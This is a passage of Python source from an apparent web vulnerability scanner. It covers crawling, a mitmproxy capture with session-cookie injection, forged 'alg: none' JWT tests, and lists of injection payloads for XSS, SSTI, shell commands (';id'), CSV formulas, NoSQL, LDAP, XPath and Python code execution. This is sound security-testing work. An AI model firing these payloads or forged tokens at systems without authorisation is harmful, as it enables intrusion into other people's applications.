                            "arguments[0].scrollIntoView({block:'center',behavior:'instant'});",
                            _cel,
                        )
                        _cel.click()
                        time.sleep(0.6)
                        _post_click_url = driver.current_url
                        if _post_click_url != _pre_click_url:
                            _nl = _normalize_url(url, _post_click_url)
                            if (_nl and _same_origin(url, _nl)
                                    and not _LOGOUT_PATH_RE.search(
                                        urllib.parse.urlparse(_nl).path or "")
                                    and _nl.rstrip("/") not in visited):
                                spa_links.append(_nl)
                                queue.append(_nl)
                            # Navigate back to recover state for next click
                            try:
                                driver.back()
                                time.sleep(0.5)
                                driver.execute_script(_SPA_INTERCEPT_JS)
                            except Exception:
                                try:
                                    driver.get(current)
                                    time.sleep(1.0)
                                    driver.execute_script(_SPA_INTERCEPT_JS)
                                except Exception:
                                    pass
                            _pre_click_url = driver.current_url
                        # Collect XHR / pushState URLs fired by this click
                        _cu = driver.execute_script(
                            "return (window._fracture_net_urls || []).splice(0);"
                        ) or []
                        for _raw_cu in _cu:
                            _nl = _normalize_url(current, _raw_cu)
                            if (_nl and _same_origin(url, _nl)
                                    and not _LOGOUT_PATH_RE.search(
                                        urllib.parse.urlparse(_nl).path or "")
                                    and _nl.rstrip("/") not in visited):
                                spa_links.append(_nl)
                                queue.append(_nl)
                    except Exception:
                        # Click may have caused unexpected navigation — re-inject
                        try:
                            driver.execute_script(_SPA_INTERCEPT_JS)
                        except Exception:
                            pass
            except Exception:
                pass

        vc.log(
            f"[crawl/spa] Headless crawl complete: {page_count} pages, "
            f"{len(set(spa_links))} links, {len(spa_forms)} forms",
            "INFO",
        )

    except Exception as exc:
        vc.log(f"[crawl/spa] Headless crawl error: {exc}", "WARNING")
    finally:
        if driver is not None:
            try:
                driver.quit()
            except Exception:
                pass

    return {
        "forms":    spa_forms,
        "links":    list(set(spa_links)),
        "js_files": list(set(spa_js)),
    }


def _phase_crawl(target: dict, cfg: dict, pm: ProgressManager,
                 out: OutputManager, sess: requests.Session) -> dict:
    phase     = "crawl"
    url       = target["url"]
    timeout   = cfg.get("timeout", 10)
    max_depth = cfg.get("crawl_depth", 10)
    max_pages = cfg.get("crawl_max_pages", 500)
    vc.status(phase, "Crawl", "running", "Crawling", 0, max_pages)

    visited:               set  = set()
    queue_urls:            list = [(url, 0)]
    all_forms:             list = []
    all_js:                list = []
    all_links:             list = []
    _crawl_path_statuses:  dict = {}
    page_count                  = 0
    _root_html:            str  = ""  # captured for SPA detection after BFS
    _spa_roots:            set  = set()  # sub-paths with SPA signals (micro-frontends)
    _checked_spa_prefixes: set  = set()  # path prefixes already tested to avoid redundant checks

    while queue_urls and page_count < max_pages:
        current_url, depth = queue_urls.pop(0)
        _norm_cur = current_url.rstrip("/")
        if _norm_cur in visited:
            continue
        visited.add(_norm_cur)
        page_count += 1
        vc.status(phase, "Crawl", "running", f"Page {page_count}", page_count, max_pages)
        data = _crawl_page(current_url, sess, timeout, url)
        if data["error"]:
            continue
        _cr = data.get("response")
        if _cr is not None:
            _crawl_path_statuses[current_url] = _cr.status_code
            try:
                _pg_html = _cr.text
            except Exception:
                _pg_html = ""
            if page_count == 1:
                _root_html = _pg_html
            elif _pg_html and _BS4_AVAILABLE:
                # Per-page SPA detection for micro-frontend discovery:
                # run once per unique two-segment path prefix so we don't
                # parse every single page but still catch sub-path SPAs
                _pg_path   = urllib.parse.urlparse(current_url).path.rstrip("/")
                _pg_prefix = "/".join(_pg_path.split("/")[:3])
                if _pg_prefix not in _checked_spa_prefixes:
                    _checked_spa_prefixes.add(_pg_prefix)
                    _pg_is_spa, _ = _detect_spa(
                        _pg_html, current_url, len(data.get("links", []))
                    )
                    if _pg_is_spa:
                        _spa_roots.add(current_url)
        all_forms.extend(data["forms"])
        all_js.extend(data["js_files"])
        all_links.extend(data["links"])
        if depth < max_depth:
            for link in data["links"]:
                _lp = urllib.parse.urlparse(link).path or ""
                if (link.rstrip("/") not in visited
                        and _same_origin(url, link)
                        and not _LOGOUT_PATH_RE.search(_lp)):
                    queue_urls.append((link, depth + 1))
            # Enqueue JS files as crawlable pages — _crawl_page's JS branch
            # extracts internal URL references from their source so those paths
            # are followed and added to the structure map.
            for js_url in data["js_files"]:
                if js_url.rstrip("/") not in visited:
                    queue_urls.append((js_url, depth + 1))

    vc.log(f"[crawl] Visited {page_count} pages, {len(all_forms)} forms, {len(all_js)} JS files", "INFO")

    # ── SPA detection and headless augmentation ──────────────────────────────
    # Check root page first; also merge any micro-frontend SPA roots found
    # during per-page BFS detection above.
    _is_root_spa, _spa_evidence = False, []
    if _root_html:
        _is_root_spa, _spa_evidence = _detect_spa(_root_html, url, len(visited))
    if _is_root_spa:
        _spa_roots.add(url)
    elif _spa_roots and not _spa_evidence:
        # Root is static but sub-paths are SPAs — micro-frontend pattern
        _spa_evidence = [f"Micro-frontend SPA detected on {len(_spa_roots)} sub-path(s)"]

    # ── Known JS-driven enterprise apps: force headless crawl ────────────────
    # Some platforms (IBM Cognos, Oracle ADF, SAP Fiori, GWT apps) are entirely
    # JS-driven but their initial HTML is a thin server-rendered shell with no
    # recognisable SPA markers — navigation and content are loaded via AMD
    # (Dojo/RequireJS) or AJAX dispatchers that _detect_spa cannot see in static
    # HTML.  When the BI tool or framework has already been identified in the
    # target profile, force headless mode regardless of heuristic SPA detection.
    _FORCE_HEADLESS_BI = frozenset({
        "IBM Cognos", "Oracle ADF", "Oracle JET", "SAP Fiori",
        "Google Web Toolkit",
    })
    if not _spa_roots:
        try:
            _tp_crawl = json.loads((out.root / "target_profile.json").read_text())
            _tp_bi    = set(_tp_crawl.get("bi_tools", []))
            _tp_tech  = set(_tp_crawl.get("technologies", []))
            _forced   = (_tp_bi | _tp_tech) & _FORCE_HEADLESS_BI
            if _forced:
                _forced_name = next(iter(_forced))
                vc.log(
                    f"[crawl] Known JS-driven platform detected ({_forced_name}) — "
                    "forcing headless crawl regardless of static SPA indicators",
                    "INFO",
                )
                _spa_roots.add(url)
                if not _spa_evidence:
                    _spa_evidence = [f"Known JS-driven platform: {_forced_name}"]
        except Exception:
            pass

    if _spa_roots:
        vc.log(
            "[crawl] SPA detected — "
            + "; ".join(_spa_evidence[:4])
            + (f" (+{len(_spa_evidence) - 4} more)" if len(_spa_evidence) > 4 else ""),
            "INFO",
        )
        out.add_finding(
            title="Single Page Application Detected",
            url=url, port=target["port"], risk="INFO",
            description=(
                f"The target appears to be a Single Page Application. "
                f"Evidence: {'; '.join(_spa_evidence)}."
            ),
            output="\n".join(_spa_evidence),
            sources="fracture-crawl", service=target["scheme"],
            owasp="A04:2025 Insecure Design", nist="CM-7",
            remediation=(
                "Ensure SPA routes are protected server-side; "
                "client-side routing is not a security boundary."
            ),
        )
        _spa_browser = _get_spa_browser()
        if _spa_browser:
            vc.status(phase, "Crawl", "running", "SPA headless crawl", 0, max_pages)
            _extra_seeds = list(_spa_roots - {url}) or None
            try:
                _spa = _phase_spa_crawl(
                    target, cfg, pm, out, sess, len(visited),
                    extra_seeds=_extra_seeds,
                )
                if _spa:
                    all_forms.extend(_spa.get("forms",    []))
                    all_links.extend(_spa.get("links",    []))
                    all_js.extend(   _spa.get("js_files", []))
                    vc.log(
                        f"[crawl] SPA headless merged: "
                        f"+{len(_spa.get('links', []))} links, "
                        f"+{len(_spa.get('forms', []))} forms",
                        "INFO",
                    )
            except Exception as _spa_err:
                vc.log(f"[crawl] SPA headless crawl exception: {_spa_err}", "WARNING")
        else:
            vc.log(
                "[crawl] No headless browser available — install selenium + "
                "chromedriver (Chrome) or geckodriver (Firefox) to enable "
                "headless SPA crawl (run install.py)",
                "WARNING",
            )
    else:
        vc.log("[crawl] No SPA indicators detected — static crawl sufficient", "INFO")

    # Update target profile web_structure with crawl-phase result (more accurate
    # than the recon-phase classification since it uses actual visited-page data).
    try:
        if _spa_roots:
            _crawl_structure = _classify_web_structure(
                _root_html or "", {}, _spa_evidence)
        else:
            _crawl_structure = _classify_web_structure(
                _root_html or "", {}, [])
        if _crawl_structure and _crawl_structure != "Unknown":
            _write_target_profile(out, web_structure=_crawl_structure)
    except Exception:
        pass

    # Persist the HTTP status code of every page the crawl actually fetched.
    # This ensures crawl-visited pages show a status code in the structure map
    # even if they're not re-probed by the endpoint tools phase.
    if _crawl_path_statuses:
        try:
            _write_structure_map(out, target, path_statuses=_crawl_path_statuses, source="crawl")
        except Exception:
            pass

    crawl_out = out.output_path(phase, "crawl_results_" + target["hostname"])
    crawl_out.write_text(
        json.dumps({
            "pages_visited": page_count,
            "links": list(set(all_links))[:500],
            "forms": all_forms[:200],
            "js_files": list(set(all_js))[:100],
        }, indent=2),
        encoding="utf-8",
    )

    _crawl_scope = {target.get("hostname") or urllib.parse.urlparse(url).hostname or ""}
    _ie_crawl_by_nl: dict = {}
    for link in set(all_links):
        if (_INTERESTING_PATH_RE.search(link)
                and _is_in_scope_url(link, _crawl_scope)
                and _is_valid_endpoint_url(link)):
            _ie_c_nl  = urllib.parse.urlparse(link).netloc or link
            _ie_c_rel = urllib.parse.urlparse(link).path or link
            if _ie_c_nl not in _ie_crawl_by_nl:
                _ie_crawl_by_nl[_ie_c_nl] = {"anchor": link, "paths": {}}
            _ie_crawl_by_nl[_ie_c_nl]["paths"][_ie_c_rel] = link
    for _ie_c_nl, _ie_c_data in _ie_crawl_by_nl.items():
        _ie_c_sorted = sorted(_ie_c_data["paths"].keys())
        out.add_finding(
            title="Interesting Endpoint Discovered",
            url=_ie_c_data["anchor"], port=target["port"], risk="INFO",
            description=(
                f"{len(_ie_c_sorted)} potentially sensitive endpoint(s) found at {_ie_c_nl}."
            ),
            sources="fracture-crawl", service=target["scheme"],
            affected="\n".join(_ie_c_sorted),
            output_file=str(crawl_out),
            owasp="A04:2025 Insecure Design", nist="CM-7",
            remediation="Review these endpoints for access controls.",
        )

    vc.status(phase, "Crawl", "running", "JS secret scan", page_count, max_pages)
    for js_url in set(all_js):
        try:
            r = sess.get(js_url, timeout=timeout)
            _js_out = _crawl_output_path(out.root, js_url)
            js_text = r.text
            # Write full JS content (up to 2MB) so evidence files are not truncated
            _js_out.write_text(js_text[:2_000_000], encoding="utf-8")
            for pat, secret_type in _SECRET_PATTERNS:
                m = pat.search(js_text)
                if m:
                    if _is_placeholder_secret(m.group(2), m.group(1)):
                        continue
                    # Include surrounding context in the finding output
                    col = m.start()
                    context = js_text[max(0, col - 80):col + 200]
                    out.add_finding(
                        title=f"Credentials/Secret in JavaScript: {secret_type}",
                        url=js_url, port=target["port"], risk="HIGH",
                        description=f"A {secret_type} was found hardcoded in JavaScript: {js_url}",
                        output=f"Match: {m.group(0)[:120]}\nContext (char {col}): ...{context}...",
                        sources="fracture-crawl", service=target["scheme"],
                        affected=js_url, output_file=str(_js_out),
                        owasp="A04:2025 Insecure Design", nist="IA-5",
                        remediation="Remove hardcoded secrets from JavaScript. Use server-side secrets management.",
                    )
                    vc.log(f"[crawl] Secret in JS: {secret_type} at {js_url} (char {col})", "SUCCESS")
        except Exception:
            pass

    vc.status(phase, "Crawl", "complete", "Done", max_pages, max_pages)
    vc.log("[crawl] Phase complete", "SUCCESS")

    # Extract params for injection phases
    all_params: list = []
    for link in set(all_links):
        parsed = urllib.parse.urlparse(link)
        if parsed.query:
            pkeys = list(urllib.parse.parse_qs(parsed.query).keys())
            if pkeys:
                all_params.append({"url": link, "params": pkeys})

    return {"forms": all_forms, "params": all_params, "links": list(set(all_links))}


# ─────────────────────────────────────────────
# Phase 3a-supplement: Manual crawl via mitmproxy
# ─────────────────────────────────────────────

def _phase_manual_crawl(out: "OutputManager", target: dict, cfg: dict,
                        effective_auth: "requests.Session",
                        scope_hostnames: "set") -> "list[str]":
    """Prompt the user to browse the target manually while Fracture listens via
    mitmproxy.  Session cookies are automatically injected by the proxy addon so
    the user's browser session is authenticated without requiring a manual login.

    Returns a list of unique URLs discovered during the manual browse session.
    These are merged into _ep_base before the shcheck / crawl / injection phases
    run so all subsequently discovered paths are tested like any other endpoint.
    """
    mitmdump = shutil.which("mitmdump")
    if not mitmdump:
        vc.log("[manual-crawl] mitmdump not found — skipping (install mitmproxy to enable)", "WARNING")
        return []

    _pid = os.getpid()
    _mitm_log  = f"/tmp/fracture_mitm_{_pid}.jsonl"
    _mitm_addon = f"/tmp/fracture_mitm_{_pid}.py"
    _ff_profile = f"/tmp/fracture_ff_{_pid}"

    # Find a free port for the proxy
    _proxy_port: "int | None" = None
    for _port_cand in range(8080, 9001):
        try:
            _ps = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            _ps.bind(("127.0.0.1", _port_cand))
            _ps.close()
            _proxy_port = _port_cand
            break
        except OSError:
            continue
    if _proxy_port is None:
        vc.log("[manual-crawl] No free port found for proxy — skipping", "WARNING")
        return []

    # Extract cookies from the authenticated session for proxy-side injection
    _cookie_dict: dict = {}
    try:
        for _ck in effective_auth.cookies:
            _cookie_dict[str(_ck.name)] = str(_ck.value)
    except Exception:
        pass

    _target_host = target["hostname"]

    # Write the mitmproxy addon script.  The addon:
    # 1. Injects stored session cookies into every in-scope request so the
    #    browser is authenticated without a manual login.
    # 2. Logs every in-scope response URL (method + status) as JSONL.
    _addon_src = (
        "import json\n"
        f"_LOGFILE = {repr(_mitm_log)}\n"
        f"_COOKIES = {repr(_cookie_dict)}\n"
        f"_TARGET_HOST = {repr(_target_host)}\n"
        "_fh = open(_LOGFILE, 'a')\n\n"
        "class _FractureAddon:\n"
        "    def request(self, flow):\n"
        "        try:\n"
        "            if _TARGET_HOST not in (flow.request.pretty_host or ''):\n"
        "                return\n"
        "            for _n, _v in _COOKIES.items():\n"
        "                if _n not in flow.request.cookies:\n"
        "                    flow.request.cookies[_n] = _v\n"
        "        except Exception:\n"
        "            pass\n"
        "    def response(self, flow):\n"
        "        try:\n"
        "            if _TARGET_HOST not in (flow.request.pretty_host or ''):\n"
        "                return\n"
        "            _fh.write(json.dumps({\n"
        "                'url': flow.request.pretty_url,\n"
        "                'method': flow.request.method,\n"
        "                'status': flow.response.status_code,\n"
        "            }) + '\\n')\n"
        "            _fh.flush()\n"
        "        except Exception:\n"
        "            pass\n\n"
        "addons = [_FractureAddon()]\n"
    )
    try:
        Path(_mitm_addon).write_text(_addon_src, encoding="utf-8")
    except Exception as e:
        vc.log(f"[manual-crawl] Could not write proxy addon: {e}", "WARNING")
        return []

    # Start mitmdump
    _proxy_proc: "subprocess.Popen | None" = None
    try:
        _proxy_proc = _popen(
            [mitmdump, "-p", str(_proxy_port),
             "--addon-file", _mitm_addon,
             "--ssl-insecure", "--quiet"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        _register_proc(_proxy_proc)
    except Exception as e:
        vc.log(f"[manual-crawl] Failed to start mitmdump: {e}", "WARNING")
        try:
            Path(_mitm_addon).unlink(missing_ok=True)
        except Exception:
            pass
        return []

    # Brief pause to let the proxy bind its port
    time.sleep(2)

    # Launch Firefox with the proxy pre-configured via a temp profile user.js.
    # The proxy injects auth cookies so the user doesn't need to log in manually.
    _browser_proc: "subprocess.Popen | None" = None
    _ff_bin = _find_firefox_binary()
    if _ff_bin:
        try:
            Path(_ff_profile).mkdir(parents=True, exist_ok=True)
            _user_js_lines = [
                'user_pref("network.proxy.type", 1);',
                f'user_pref("network.proxy.http", "127.0.0.1");',
                f'user_pref("network.proxy.http_port", {_proxy_port});',
                f'user_pref("network.proxy.ssl", "127.0.0.1");',
                f'user_pref("network.proxy.ssl_port", {_proxy_port});',
                'user_pref("network.proxy.no_proxies_on", "");',
                f'user_pref("browser.startup.homepage", {repr(target["url"])});',
                'user_pref("security.cert_pinning.enforcement_level", 0);',
                'user_pref("network.stricttransportsecurity.preloadlist", false);',
            ]
            (Path(_ff_profile) / "user.js").write_text(
                "\n".join(_user_js_lines) + "\n", encoding="utf-8"
            )
            _browser_proc = _popen(
                [_ff_bin, "--profile", _ff_profile, "--no-remote", target["url"]],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            _register_proc(_browser_proc)
            vc.log("[manual-crawl] Firefox launched — proxy and session cookies configured", "INFO")
        except Exception as e:
            vc.log(f"[manual-crawl] Firefox launch failed ({e}) — configure browser manually", "WARNING")
            _browser_proc = None
    else:
        vc.log(
            f"[manual-crawl] Firefox not found — manually set your browser proxy to "
            f"127.0.0.1:{_proxy_port} (trust all certificates) and browse the target",
            "WARNING",
        )

    _cookie_note = (
        "Session cookies injected automatically via proxy."
        if _cookie_dict
        else "No session detected — log in manually in the browser."
    )
    vc.log(
        f"[manual-crawl] Proxy listening on 127.0.0.1:{_proxy_port}. "
        f"{_cookie_note} Browse the target then signal completion.",
        "INFO",
    )
    vc.status("manual_crawl", "Manual Crawl", "running",
              f"Proxy: 127.0.0.1:{_proxy_port} — browse the target then confirm done")

    try:
        vc.prompt(
            f"Manual crawl is active (proxy: 127.0.0.1:{_proxy_port}). "
            f"{_cookie_note} "
            "Navigate through the target application. "
            "Type 'done' and press Enter when finished to continue testing.",
            prompt_type="text",
            skippable=True,
        )
    except Exception:
        pass

    vc.status("manual_crawl", "Manual Crawl", "complete", "Parsing captured requests")

    # Teardown
    for _p in (_browser_proc, _proxy_proc):
        if _p is not None:
            try:
                _p.terminate()
                _deregister_proc(_p)
            except Exception:
                pass

    # Parse the JSONL capture log
    _discovered_urls: list = []
    try:
        _log_path = Path(_mitm_log)
        if _log_path.exists():
            _seen_paths: set = set()
            for _line in _log_path.read_text(encoding="utf-8", errors="ignore").splitlines():
                try:
                    _entry = json.loads(_line.strip())
                    _raw_url = _entry.get("url", "")
                    if not _raw_url:
                        continue
                    _parsed_u = urllib.parse.urlparse(_raw_url)
                    _u_host = _parsed_u.hostname or ""
                    if _target_host not in _u_host:
                        continue
                    # Normalise: strip query string and fragment; keep path only
                    _norm_url = urllib.parse.urlunparse((
                        _parsed_u.scheme, _parsed_u.netloc,
                        _parsed_u.path, "", "", "",
                    ))
                    _u_path = _parsed_u.path or "/"
                    if _u_path not in _seen_paths:
                        _seen_paths.add(_u_path)
                        _discovered_urls.append(_norm_url)
                except Exception:
                    continue
    except Exception:
        pass

    # Clean up temp files
    for _tmp_f in (_mitm_addon, _mitm_log):
        try:
            Path(_tmp_f).unlink(missing_ok=True)
        except Exception:
            pass
    try:
        import shutil as _shutil_mc
        _shutil_mc.rmtree(_ff_profile, ignore_errors=True)
    except Exception:
        pass

    _n = len(_discovered_urls)
    vc.log(
        f"[manual-crawl] {_n} unique path(s) captured from manual browse session",
        "SUCCESS" if _n else "INFO",
    )
    return list(dict.fromkeys(_discovered_urls))


# ─────────────────────────────────────────────
# Phase 3b: JWT security testing
# ─────────────────────────────────────────────

_JWT_RE = re.compile(
    r'eyJ[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]*'
)


def _phase_jwt(target: dict, cfg: dict, pm: ProgressManager,
               out: OutputManager, sess: requests.Session,
               crawl_data: dict) -> None:
    """Test JWT security across the target.

    Collection:
      - Main URL response body and Set-Cookie headers.
      - Crawled page bodies (from crawl_data["links"], capped at 30 pages).
      - Authorization / X-Auth-Token response headers.

    Tests:
      1. Algorithm identification — log header algorithm as an INFO finding.
      2. 'none' algorithm bypass — forge a token with alg=none, no signature,
         probe the same URL with Bearer auth; flag CRITICAL if server accepts it.
      3. jwt_tool — if available, run ``jwt_tool <token> -X a -np`` to confirm
         algorithm confusion attacks (-X a) without proxying (-np).

    Output saved to: jwt/<hostname>_<port>_jwt_tool.txt
    """
    phase   = "jwt"
    url     = target["url"]
    port    = target["port"]
    timeout = cfg.get("timeout", 10)

    vc.status(phase, "JWT", "running", "Token collection", 0, 3)

    found_tokens: set = set()

    # Collect from main URL response
    try:
        r = sess.get(url, timeout=timeout)
        for m in _JWT_RE.finditer(r.text):
            found_tokens.add(m.group(0))
        # Check response headers (some APIs put token in headers)
        for hdr in ("Authorization", "X-Auth-Token", "X-Access-Token"):
            hv = r.headers.get(hdr, "")
            for m in _JWT_RE.finditer(hv):
                found_tokens.add(m.group(0))
        # Check cookies
        for ck in r.cookies:
            for m in _JWT_RE.finditer(str(ck.value)):
                found_tokens.add(m.group(0))
    except Exception:
        pass

    # Collect from crawled pages
    for link in crawl_data.get("links", [])[:30]:
        try:
            r = sess.get(link, timeout=timeout)
            for m in _JWT_RE.finditer(r.text):
                found_tokens.add(m.group(0))
        except Exception:
            pass

    if not found_tokens:
        vc.log("[jwt] No JWT tokens found — skipping", "INFO")
        vc.status(phase, "JWT", "complete", "No tokens found", 3, 3)
        return

    vc.log(f"[jwt] {len(found_tokens)} JWT token(s) collected", "INFO")
    vc.status(phase, "JWT", "running", "Algorithm analysis", 1, 3)

    import base64 as _b64

    for token in list(found_tokens)[:5]:
        parts = token.split(".")
        if len(parts) != 3:
            continue
        try:
            # Decode header (base64url, pad to 4-byte boundary)
            hdr_raw  = parts[0] + "=" * (-len(parts[0]) % 4)
            hdr_json = json.loads(_b64.urlsafe_b64decode(hdr_raw).decode("utf-8", errors="replace"))
            alg      = hdr_json.get("alg", "unknown")

            out.add_finding(
                title=f"JWT Token Identified: Algorithm {alg}",
                url=url, port=port, risk="INFO",
                description=(
                    f"A JWT token using algorithm '{alg}' was identified in the "
                    f"application's traffic. Verify algorithm is appropriate "
                    f"(RS256/ES256 preferred over HS256; 'none' is insecure)."
                ),
                output=f"alg: {alg}\nHeader: {json.dumps(hdr_json)}",
                sources="fracture-jwt", service=target["scheme"],
                owasp="A07:2025 Identification and Authentication Failures", nist="IA-5",
                remediation=(
                    "Use asymmetric algorithms (RS256, ES256). "
                    "Validate algorithm server-side against a strict allowlist."
                ),
            )

            # ── Test 1: 'none' algorithm bypass ──────────────────────────────
            none_hdr_b64 = (
                _b64.urlsafe_b64encode(
                    json.dumps({**hdr_json, "alg": "none"}).encode()
                ).rstrip(b"=").decode()
            )
            none_token = f"{none_hdr_b64}.{parts[1]}."

            # Probe — compare authenticated vs unauthenticated status codes
            try:
                r_base  = sess.get(url, timeout=timeout)
                r_none  = sess.get(url, timeout=timeout,
                                   headers={"Authorization": f"Bearer {none_token}"})
                r_orig  = sess.get(url, timeout=timeout,
                                   headers={"Authorization": f"Bearer {token}"})
                # If 'none' token gives same 200 as original but base is 401/403 → vulnerable
                if (r_none.status_code == 200
                        and r_base.status_code in (401, 403)
                        and r_orig.status_code == 200):
                    out.add_finding(
                        title="JWT Vulnerability: 'none' Algorithm Accepted",
                        url=url, port=port, risk="CRITICAL",
                        description=(
                            "The server accepted a JWT with 'alg': 'none' and an empty "
                            "signature, bypassing cryptographic validation entirely. "
                            "An attacker can forge arbitrary token claims with no credentials. "
                            "CWE-347 (Improper Verification of Cryptographic Signature). "
                            "CVSS 9.8 CRITICAL (CVE-2015-9235)."
                        ),
                        output=(
                            f"Original alg: {alg}\n"
                            f"Base response: HTTP {r_base.status_code}\n"
                            f"Forged (none) response: HTTP {r_none.status_code}"
                        ),
                        sources="fracture-jwt", service=target["scheme"],
                        cves="CVE-2015-9235, CVE-2016-10555",
                        owasp="A07:2025 Identification and Authentication Failures", nist="IA-5",
                        remediation=(
                            "Explicitly reject tokens specifying 'alg': 'none'. "
                            "Validate the algorithm field against a server-side allowlist "
                            "before verifying the signature."
                        ),
                    )
                    vc.log("[jwt] CRITICAL: 'none' algorithm bypass confirmed!", "SUCCESS")
            except Exception:
                pass

        except Exception:
            continue

    # ── Test 2: jwt_tool ─────────────────────────────────────────────────────
    vc.status(phase, "JWT", "running", "jwt_tool", 2, 3)
    jwt_tool_bin = _find_tool("jwt_tool") or _find_tool("jwt_tool.py")
    if jwt_tool_bin and found_tokens:
        sample = next(iter(found_tokens))
        jt_out = out.output_path("jwt", f"jwt_tool_{target['hostname']}_{port}")
        if jwt_tool_bin.endswith(".py"):
            cmd = [sys.executable, jwt_tool_bin, sample, "-X", "a", "-np"]
        else:
            cmd = [jwt_tool_bin, sample, "-X", "a", "-np"]
        vc.log("[jwt] Running jwt_tool algorithm confusion test ...", "INFO")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            _register_proc(proc)
            stdout_jt, _ = proc.communicate(timeout=30)
            _deregister_proc(proc)
            jt_out.write_text(stdout_jt, encoding="utf-8", errors="replace")
            out.log_command("jwt_tool", cmd, jt_out)
            if re.search(r'RESULT.*VULNERABLE|successfully forged|VULNERABLE', stdout_jt, re.I):
                out.add_finding(
                    title="JWT Vulnerability Confirmed by jwt_tool",
                    url=url, port=port, risk="CRITICAL",
                    description=(
                        "jwt_tool confirmed a JWT algorithm confusion vulnerability. "
                        "CWE-347 (Improper Verification of Cryptographic Signature). "
                        "CVSS 9.8 CRITICAL (CVE-2015-9235)."
                    ),
                    output=stdout_jt[:2000], sources="jwt_tool",
                    service=target["scheme"], output_file=str(jt_out),
                    cves="CVE-2015-9235, CVE-2016-10555",
                    owasp="A07:2025 Identification and Authentication Failures", nist="IA-5",
                    remediation=(
                        "Validate algorithm server-side. Reject 'none' and weak HMAC "
                        "when asymmetric keys are expected."
                    ),
                )
        except Exception as e:
            out.log_error("jwt_tool", cmd, str(e))
    elif not jwt_tool_bin:
        vc.log("[jwt] jwt_tool not found — install jwt_tool for deeper testing", "WARNING")

    vc.status(phase, "JWT", "complete", "Done", 3, 3)
    vc.log("[jwt] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 4: Injection
# ─────────────────────────────────────────────
_SQL_ERROR_RE = re.compile(
    r"(SQL syntax.*MySQL|Warning.*mysql_|MySQLSyntaxError|"
    r"valid MySQL result|ORA-\d{5}|Oracle.*Driver|"
    r"quoted string not properly terminated|Microsoft SQL Server|"
    r"Unclosed quotation mark|PostgreSQL.*ERROR|Warning.*pg_|"
    r"SQLite.*error|near \".+\": syntax error|"
    r"Exception.*System\.Data\.SqlClient|"
    r"You have an error in your SQL syntax)",
    re.IGNORECASE,
)
_XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
]

def _xss_confirmed(payload: str, r) -> bool:
    """Return True only if payload appears in an executable HTML context.

    Eliminates false positives where the app reflects the payload safely:
      - URL reflected in an href/src/action attribute (URL kept as a link)
      - Payload HTML-encoded (browser won't execute it)
      - Payload only present in the request URL echo
    """
    import html as _html_mod
    text = r.text
    if payload not in text:
        return False

    # 1. If every occurrence is HTML-encoded, it's safe
    enc = _html_mod.escape(payload, quote=True)
    if enc != payload and enc in text:
        stripped = text.replace(enc, "")
        if payload not in stripped:
            return False

    # 2. Strip the request URL and its decoded variants (URL reflection)
    body = text
    for variant in (r.url,
                    urllib.parse.unquote(r.url),
                    urllib.parse.unquote_plus(r.url)):
        body = body.replace(variant, "")

    # 3. Strip payload appearances inside URL attribute values
    #    e.g.  href="...payload..."  or  href='...payload...'
    _esc_pl = re.escape(payload)
    body = re.sub(
        r'(?:href|src|action|content|data(?:-[a-z][a-z0-9-]*)?)(?:\s*)=(?:\s*)["\'][^"\']*'
        + _esc_pl + r'[^"\']*["\']',
        '', body, flags=re.I
    )
    # Also strip URL-percent-encoded occurrences inside attributes
    _url_enc_pl = urllib.parse.quote(payload, safe='')
    if _url_enc_pl != payload:
        body = re.sub(
            r'(?:href|src|action|content)(?:\s*)=(?:\s*)["\'][^"\']*'
            + re.escape(_url_enc_pl) + r'[^"\']*["\']',
            '', body, flags=re.I
        )

    return payload in body

def _ssti_probes():
    """Generate randomised SSTI payloads so the expected result is unique
    and cannot appear on the page by coincidence or URL reflection."""
    _a = random.randint(10000, 99999)
    _b = random.randint(10000, 99999)
    _r = str(_a * _b)
    return [
        (f"{{{{{_a}*{_b}}}}}", _r),
        (f"${{{_a}*{_b}}}",    _r),
        (f"#{{{_a}*{_b}}}",    _r),
        (f"<%= {_a}*{_b} %>",  _r),
    ]
_CMD_PAYLOADS = [
    (";id",    re.compile(r'uid=\d+\(')),
    ("|id",    re.compile(r'uid=\d+\(')),
    ("&id",    re.compile(r'uid=\d+\(')),
    ("`id`",   re.compile(r'uid=\d+\(')),
]
_CRLF_PAYLOAD = "%0d%0aX-Injected-Fracture: test"

_NOSQL_PAYLOADS = [
    ('{"$gt": ""}',       re.compile(r'\$gt|\$ne|\$where|unexpected.*operator|cast.*failed|E11000', re.I)),
    ('{"$ne": null}',     re.compile(r'\$gt|\$ne|\$where|unexpected.*operator|E11000', re.I)),
    ("[$ne]=1",           re.compile(r'\$ne|\$gt|unexpected.*operator', re.I)),
]
_LDAP_PAYLOADS = [
    ("*)(cn=*",           re.compile(r'ldap.*error|invalid.*dn|javax\.naming|objectClass', re.I)),
    (")(|(objectClass=*", re.compile(r'ldap.*error|invalid.*dn|javax\.naming|objectClass', re.I)),
]
_XPATH_PAYLOADS = [
    ("' or '1'='1",       re.compile(r'xpath|xquery|xmlsyntax|invalid.*expression', re.I)),
    ("' or 1=1 or 'x'='x", re.compile(r'xpath|xquery|xmlsyntax|invalid.*expression', re.I)),
]
_LOG_INJECT_PAYLOAD = "%0afracture_log_inject_SUCCESS%0a"
_CSV_INJECT_PAYLOADS = [
    "=CMD|'/C echo fracture'!A0",
    "+cmd|'/C echo fracture'!A0",
    "@SUM(1+1)*cmd|'/C echo fracture'!A0",
]
def _code_inject_probes():
    """Generate randomised code injection payloads.  A per-run nonce and
    large random arithmetic result make coincidental matches impossible."""
    _nonce  = random.randint(100000, 999999)
    _marker = f"fracture_{_nonce}"
    _a      = random.randint(10000, 99999)
    _b      = random.randint(10000, 99999)
    _eval_r = str(_a * _b)
    return [
        (f"__import__('os').system('echo {_marker}')", re.compile(re.escape(_marker))),
        (f"eval(str({_a}*{_b}))",                      re.compile(rf'\b{re.escape(_eval_r)}\b')),
        (f";echo {_marker};#",                          re.compile(re.escape(_marker))),
    ]
